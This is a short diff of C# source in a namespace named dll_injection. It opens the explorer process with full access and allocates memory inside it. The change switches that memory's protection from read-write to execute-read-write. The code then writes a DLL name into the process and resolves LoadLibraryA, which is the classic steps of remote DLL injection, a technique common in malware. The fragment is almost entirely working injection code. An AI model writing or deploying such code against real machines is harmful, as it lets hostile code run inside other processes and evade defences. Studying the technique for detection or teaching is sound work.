@@ -37,7 +37,7 @@ namespace dll_injection
             Process[] expProc = Process.GetProcessesByName("explorer");
             int pid = expProc[0].Id;
             IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
-            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
             IntPtr outSize; 
             Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
             IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
